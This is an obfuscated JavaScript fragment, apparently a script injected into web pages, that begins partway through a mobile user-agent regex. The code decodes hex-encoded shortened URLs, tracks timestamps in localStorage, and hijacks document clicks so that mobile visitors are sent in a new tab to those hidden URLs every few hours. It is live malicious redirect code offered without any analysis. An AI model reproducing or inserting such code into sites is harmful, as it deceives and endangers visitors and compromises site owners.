ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());